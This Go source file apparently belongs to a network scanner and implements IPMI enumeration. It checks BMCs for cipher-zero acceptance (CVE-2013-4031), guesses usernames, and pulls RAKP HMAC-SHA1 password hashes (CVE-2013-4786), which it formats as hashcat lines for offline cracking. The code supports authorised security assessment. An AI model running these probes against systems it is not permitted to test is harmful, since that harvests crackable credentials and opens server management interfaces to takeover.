// Package ipmi implements the `enumerate ipmi` command.
//
// Three pre-auth probes against UDP/623, in sequence:
//
//  1. Get-Channel-Authentication-Capabilities. Same probe the discover
//     plugin runs; we re-run it here so the enumerate report stands on
//     its own (an operator may invoke `enumerate ipmi` directly without
//     first running discover, and the deep probes need to know whether
//     IPMI 2.0 is supported anyway).
//
//  2. Cipher Zero Open Session (CVE-2013-4031). A BMC that returns
//     status 0x00 to an RMCP+ Open Session Request with cipher suite 0
//     (no auth / no integrity / no confidentiality) is critically
//     misconfigured — any subsequent IPMI commands will run as the
//     named user without authentication.
//
//  3. RAKP HMAC-SHA1 disclosure (CVE-2013-4786). For each guessed
//     username in DefaultUsernameGuesses we complete an Open Session +
//     RAKP-1/RAKP-2 round-trip. RAKP-2 carries an HMAC-SHA1 keyed with
//     the user's password material — offline-crackable as hashcat
//     -m 7300. A non-zero status from RAKP-2 indicates the username
//     does not exist on the BMC; the deep probe records which guesses
//     returned a hash so the operator gets both the existence oracle
//     and the crackable blob in one signal.
//
// The probes are gated on IPMI-2.0 support reported by the auth-caps
// banner — sending RMCP+ to a v1.5-only BMC just times out.
package ipmi

import (
	"context"
	"encoding/hex"
	"fmt"
	"net"
	"strconv"
	"time"

	commonprotocolfern "github.com/Method-Security/networkscan/generated/go/common/protocol"
	enumeratefern "github.com/Method-Security/networkscan/generated/go/enumerate"
	ipmifern "github.com/Method-Security/networkscan/generated/go/enumerate/ipmi"
	"github.com/Method-Security/networkscan/internal/discover/service/helpers"
	ipmiprotocol "github.com/Method-Security/networkscan/internal/protocol/ipmi"
)

// udpReadBufferSize bounds the maximum response payload we'll accept
// from a BMC in a single read. IPMI 2.0 open-session + RAKP-2 success
// responses are under 100 bytes; 1024 leaves plenty of headroom while
// matching what the helper expects.
const udpReadBufferSize = 1024

// LibraryEnumerateIPMI implements NetworkApplicationLibrary for IPMI
// deep-probe enumeration.
type LibraryEnumerateIPMI struct{}

// EnumerateTarget runs the three-probe IPMI pipeline against a single
// host:port and returns the enumerate-details union variant. The host
// portion may be an IP or a name that resolves; port must parse to a
// valid uint16.
//
// All errors are appended to the returned slice — the function never
// returns a nil details pointer so the engine can always wrap it in
// EnumerateServiceDetails.
func (l *LibraryEnumerateIPMI) EnumerateTarget(ctx context.Context, target string) (*enumeratefern.EnumerateServiceDetails, []string) {
	details := &ipmifern.EnumerateIpmiDetails{}
	errors := []string{}

	host, portStr, err := net.SplitHostPort(target)
	if err != nil {
		errors = append(errors, fmt.Sprintf("invalid target %q: %v", target, err))
		return &enumeratefern.EnumerateServiceDetails{EnumerateIpmiDetails: details}, errors
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		errors = append(errors, fmt.Sprintf("invalid port in target %q: %v", target, err))
		return &enumeratefern.EnumerateServiceDetails{EnumerateIpmiDetails: details}, errors
	}
	if port < 1 || port > 65535 {
		errors = append(errors, fmt.Sprintf("port %d out of range (1-65535)", port))
		return &enumeratefern.EnumerateServiceDetails{EnumerateIpmiDetails: details}, errors
	}
	details.Target = host
	details.Port = port

	ip := net.ParseIP(host)
	if ip == nil {
		resolved, lookupErr := net.LookupIP(host)
		if lookupErr != nil || len(resolved) == 0 {
			errors = append(errors, fmt.Sprintf("cannot resolve host %q: %v", host, lookupErr))
			return &enumeratefern.EnumerateServiceDetails{EnumerateIpmiDetails: details}, errors
		}
		ip = resolved[0]
	}

	// Per-probe UDP read timeout. Derive from the surrounding context's
	// deadline (the enumerate engine creates a per-target ctx with the
	// CLI's --timeout) so a slow BMC can't pin the whole budget on one
	// probe. Three sequential probes, so /3.
	//
	// helpers.UDPExchange treats timeout==0 as "deadline=now" (instant
	// failure), so we floor to 1s. A negative value means "no
	// deadline" — propagate that if the caller asked for it.
	perProbeTimeout := perProbeTimeoutFromCtx(ctx)

	// Probe A: Get-Channel-Authentication-Capabilities. Gate of the
	// whole pipeline — failure here means the host is not IPMI.
	caps, rawCapsResp, capsErr := runAuthCapsProbe(ctx, ip, port, perProbeTimeout)
	if capsErr != nil {
		errors = append(errors, fmt.Sprintf("auth-caps probe failed: %v", capsErr))
		return &enumeratefern.EnumerateServiceDetails{EnumerateIpmiDetails: details}, errors
	}

	version := caps.Version()
	details.ServerInfo = &commonprotocolfern.IpmiServerInfo{
		Version:          &version,
		AuthType:         authTypeStringFromResponse(rawCapsResp),
		AuthCapabilities: authCapsToFern(caps),
	}

	// Probes B and C are RMCP+ — only meaningful when the BMC
	// advertised IPMI 2.0 support.
	if !caps.IPMI20Supported {
		return &enumeratefern.EnumerateServiceDetails{EnumerateIpmiDetails: details}, errors
	}

	// Probe B: Cipher Zero Open Session Request (CVE-2013-4031).
	accepted, ok := runCipherZeroProbe(ctx, ip, port, perProbeTimeout)
	if ok {
		details.CipherZeroAccepted = &accepted
	}

	// Probe C: RAKP HMAC-SHA1 disclosure (CVE-2013-4786).
	probed, disclosures := runRAKPExistenceOracle(ctx, ip, port, perProbeTimeout, ipmiprotocol.DefaultUsernameGuesses)
	if len(probed) > 0 {
		details.ProbedUsernames = probed
	}
	if len(disclosures) > 0 {
		details.RakpHashesDisclosed = disclosures
	}

	return &enumeratefern.EnumerateServiceDetails{EnumerateIpmiDetails: details}, errors
}

// perProbeTimeoutFromCtx derives the per-UDP-call timeout (in seconds)
// from the context's deadline. The engine sets a per-target deadline
// of config.Timeout seconds; we split that three ways across the
// auth-caps / cipher-zero / RAKP probes.
//
// Returns -1 when ctx has no deadline (caller asked for no timeout).
// Returns 1 (the floor) when integer division would underflow to 0,
// since helpers.UDPExchange treats 0 as "deadline=now".
func perProbeTimeoutFromCtx(ctx context.Context) int {
	deadline, ok := ctx.Deadline()
	if !ok {
		return -1
	}
	remaining := time.Until(deadline)
	if remaining <= 0 {
		return 1
	}
	perProbe := int(remaining.Seconds()) / 3
	if perProbe < 1 {
		perProbe = 1
	}
	return perProbe
}

// authTypeStringFromResponse returns the backward-compatible authType
// string (hex byte of the Auth-Type-Support-1 bitmap) so downstream
// consumers that read IpmiServerInfo keep working. The discover plugin
// writes the same value when it runs against the same host. Falls back
// to "0x00" when the response was too short to include the bitmap byte.
func authTypeStringFromResponse(rawCapsResp []byte) *string {
	s := "0x00"
	if rawByte, ok := ipmiprotocol.CopyAuthTypeSupport1(rawCapsResp); ok {
		s = fmt.Sprintf("0x%02x", rawByte)
	}
	return &s
}

// runAuthCapsProbe performs Probe A. Returns the parsed AuthCapabilities
// alongside the raw response (for callers that need the literal bitmap
// byte for backward-compat authType serialization).
func runAuthCapsProbe(ctx context.Context, ip net.IP, port int, timeout int) (ipmiprotocol.AuthCapabilities, []byte, error) {
	resp, err := helpers.UDPExchange(ctx, ip, port, timeout, ipmiprotocol.BuildGetChannelAuthCapabilitiesRequest(), udpReadBufferSize)
	if err != nil {
		return ipmiprotocol.AuthCapabilities{}, nil, err
	}
	caps, err := ipmiprotocol.ParseAuthCapabilities(resp)
	if err != nil {
		return ipmiprotocol.AuthCapabilities{}, nil, err
	}
	return caps, resp, nil
}

// runCipherZeroProbe performs Probe B. Returns (accepted, ok) — ok==false
// means we never got a parseable response and the field should be
// omitted from the report.
func runCipherZeroProbe(ctx context.Context, ip net.IP, port int, timeout int) (bool, bool) {
	const messageTag byte = 0x00
	consoleSID, err := ipmiprotocol.GenerateConsoleSessionID()
	if err != nil {
		return false, false
	}
	probe := ipmiprotocol.BuildCipherZeroOpenSessionRequest(messageTag, consoleSID)
	resp, err := helpers.UDPExchange(ctx, ip, port, timeout, probe, udpReadBufferSize)
	if err != nil {
		return false, false
	}
	openResp, err := ipmiprotocol.ParseOpenSessionResponse(resp)
	if err != nil {
		return false, false
	}
	return openResp.Accepted(), true
}

// runRAKPExistenceOracle performs Probe C. Returns the list of
// usernames we tried and the disclosures for any that succeeded.
//
// probeBudget is the *total* per-probe time budget (in seconds) Probe
// C is allowed to consume — splitting that across `len(usernames)`
// guesses × 2 UDP exchanges (open-session + RAKP-1) bounds the actual
// wall time. Without this division Probe C could blow well past the
// caller's per-host budget (5 guesses × 2 calls × probeBudget ≈ 10×
// the intended ceiling). A negative probeBudget means "no timeout"
// (matches Detect's timeout<=0 contract) and is propagated to the
// per-call value verbatim so RAKP reads can block — flooring it to
// 1s would defeat the caller's intent.
func runRAKPExistenceOracle(ctx context.Context, ip net.IP, port int, probeBudget int, usernames []string) ([]string, []*commonprotocolfern.IpmiRakpHashDisclosure) {
	probed := make([]string, 0, len(usernames))
	disclosures := make([]*commonprotocolfern.IpmiRakpHashDisclosure, 0, len(usernames))

	var perCallTimeout int
	if probeBudget < 0 {
		// Caller asked for no deadline at the host level — preserve
		// that for each RAKP UDP exchange. helpers.SetDeadline
		// short-circuits on HasTimeout=false (timeout<0), so reads
		// block until data or peer close.
		perCallTimeout = -1
	} else {
		// Per-call budget: each username burns up to 2 UDP exchanges.
		// Integer floor; 1s minimum so we never pass 0 (which means
		// "deadline=now" to helpers.SetDeadline).
		denom := 2 * len(usernames)
		if denom < 1 {
			denom = 1
		}
		perCallTimeout = probeBudget / denom
		if perCallTimeout < 1 {
			perCallTimeout = 1
		}
	}

	// Wrap the loop with a context deadline tied to the overall probe
	// budget. If individual calls overrun (BMCs do that), the outer
	// deadline short-circuits the remaining guesses. When probeBudget
	// <=0, ContextDuration returns context.WithCancel — no deadline,
	// matching the caller's contract.
	probeCtx, cancel := helpers.ContextDuration(ctx, helpers.Timeout(probeBudget))
	defer cancel()

	for _, username := range usernames {
		// Context cancellation between guesses gives the outer
		// enumeration sweep a way out without waiting on the per-probe
		// UDP timeout for every remaining username.
		if err := probeCtx.Err(); err != nil {
			break
		}
		probed = append(probed, username)
		disclosure, ok := runSingleRAKP(probeCtx, ip, port, perCallTimeout, username)
		if ok {
			disclosures = append(disclosures, disclosure)
		}
	}
	return probed, disclosures
}

// runSingleRAKP performs one Open-Session + RAKP-1/RAKP-2 round-trip
// for a guessed username. Returns (disclosure, true) when the BMC
// returned an HMAC-SHA1 blob (CVE-2013-4786). Returns ok==false for
// any failure: bad open-session response, timed-out RAKP-1, RAKP-2
// status != 0 (username not found), or truncated response.
func runSingleRAKP(ctx context.Context, ip net.IP, port int, timeout int, username string) (*commonprotocolfern.IpmiRakpHashDisclosure, bool) {
	consoleSID, err := ipmiprotocol.GenerateConsoleSessionID()
	if err != nil {
		return nil, false
	}
	// Open Session with HMAC-SHA1 / HMAC-SHA1-96 / AES-CBC-128 (cipher
	// suite 3). We don't actually use the negotiated cipher — we never
	// run an authenticated command — but the BMC will only return RAKP
	// material when we picked a non-NONE auth algorithm.
	const messageTag byte = 0x01
	openReq := ipmiprotocol.BuildOpenSessionRequest(messageTag, ipmiprotocol.PrivilegeAdministrator, consoleSID,
		ipmiprotocol.AuthAlgorithmRAKPHMACSHA1,
		ipmiprotocol.IntegrityAlgorithmHMACSHA196,
		ipmiprotocol.ConfidentialityAlgorithmAESCBC128)
	openResp, err := helpers.UDPExchange(ctx, ip, port, timeout, openReq, udpReadBufferSize)
	if err != nil {
		return nil, false
	}
	parsedOpen, err := ipmiprotocol.ParseOpenSessionResponse(openResp)
	if err != nil || !parsedOpen.Accepted() {
		return nil, false
	}

	consoleNonce, err := ipmiprotocol.GenerateConsoleNonce()
	if err != nil {
		return nil, false
	}
	const rakpTag byte = 0x02
	rakp1, err := ipmiprotocol.BuildRAKPMessage1(rakpTag, parsedOpen.BMCSessionID, consoleNonce, username)
	if err != nil {
		return nil, false
	}
	rakp2Raw, err := helpers.UDPExchange(ctx, ip, port, timeout, rakp1, udpReadBufferSize)
	if err != nil {
		return nil, false
	}
	rakp2, err := ipmiprotocol.ParseRAKPMessage2(rakp2Raw)
	if err != nil || !rakp2.Success() {
		return nil, false
	}

	bmcGUIDHex := hex.EncodeToString(rakp2.BMCGUID[:])
	consoleNonceHex := hex.EncodeToString(consoleNonce[:])
	bmcNonceHex := hex.EncodeToString(rakp2.BMCNonce[:])
	bmcSIDHex := fmt.Sprintf("%08x", parsedOpen.BMCSessionID)
	consoleSIDHex := fmt.Sprintf("%08x", consoleSID)
	// privilegeLevel reports the IPMI privilege we requested for the
	// open session (Administrator == 0x04), NOT the RAKP-1 role byte
	// (which is Administrator OR'd with name-only-lookup, 0x14).
	// Downstream consumers reading IpmiRakpHashDisclosure.privilegeLevel
	// expect the IPMI privilege level, not the RAKP wire byte.
	privilegeLevel := int(ipmiprotocol.PrivilegeAdministrator)
	hmacHex := hex.EncodeToString(rakp2.KeyExchangeAuthCode)

	hashcatLine := ipmiprotocol.FormatHashcatLine(username,
		parsedOpen.BMCSessionID, consoleSID,
		consoleNonce[:], rakp2.BMCNonce[:], rakp2.BMCGUID[:],
		ipmiprotocol.HashcatRoleByte, rakp2.KeyExchangeAuthCode)

	return &commonprotocolfern.IpmiRakpHashDisclosure{
		Username:         username,
		BmcGuid:          &bmcGUIDHex,
		ConsoleNonce:     &consoleNonceHex,
		BmcNonce:         &bmcNonceHex,
		BmcSessionId:     &bmcSIDHex,
		ConsoleSessionId: &consoleSIDHex,
		PrivilegeLevel:   &privilegeLevel,
		HmacSha1:         hmacHex,
		HashcatLine:      &hashcatLine,
	}, true
}

// authCapsToFern translates the parsed AuthCapabilities struct into
// the Fern model. The Fern schema documents that omitted fields mean
// "the response was too short to parse that byte" — so we leave the
// pointer nil whenever the source bitmap wasn't actually read, rather
// than emitting `false` and lying about partial v1.5-only responses.
//
// Bitmap1Parsed gates None/MD2/MD5/Straight/OEM/IPMI20-extended.
// Bitmap2Parsed gates the user-class / per-msg flags.
// Bitmap3Parsed gates IPMI 1.5 / 2.0 support flags.
// OEMIDParsed gates the OEM ID.
// Channel number is always populated when ParseAuthCapabilities
// succeeds (it's read before the bitmap1 gate).
func authCapsToFern(caps ipmiprotocol.AuthCapabilities) *commonprotocolfern.IpmiAuthCapabilities {
	out := &commonprotocolfern.IpmiAuthCapabilities{}
	channel := int(caps.ChannelNumber)
	out.ChannelNumber = &channel

	if caps.Bitmap1Parsed {
		authNone := caps.AuthNone
		authMD2 := caps.AuthMD2
		authMD5 := caps.AuthMD5
		authStraight := caps.AuthStraight
		authOEM := caps.AuthOEM
		ipmi20Ext := caps.IPMI20ExtendedCapabilities
		out.None = &authNone
		out.Md2 = &authMD2
		out.Md5 = &authMD5
		out.StraightPassword = &authStraight
		out.Oem = &authOEM
		out.Ipmi20ExtendedCapabilities = &ipmi20Ext
	}

	if caps.Bitmap2Parsed {
		perMsg := caps.PerMessageAuthDisabled
		userLvl := caps.UserLevelAuthDisabled
		anon := caps.AnonymousLoginEnabled
		nullUser := caps.NullUsernameEnabled
		nonNull := caps.NonNullUsernameEnabled
		kg := caps.KgSet
		out.PerMessageAuthDisabled = &perMsg
		out.UserLevelAuthDisabled = &userLvl
		out.AnonymousLoginEnabled = &anon
		out.NullUsernameEnabled = &nullUser
		out.NonNullUsernameEnabled = &nonNull
		out.KgSet = &kg
	}

	if caps.Bitmap3Parsed {
		ipmi15Supp := caps.IPMI15Supported
		ipmi20Supp := caps.IPMI20Supported
		out.Ipmi15Supported = &ipmi15Supp
		out.Ipmi20Supported = &ipmi20Supp
	}

	if caps.OEMIDParsed {
		oemID := int(caps.OEMID)
		out.OemId = &oemID
	}

	return out
}
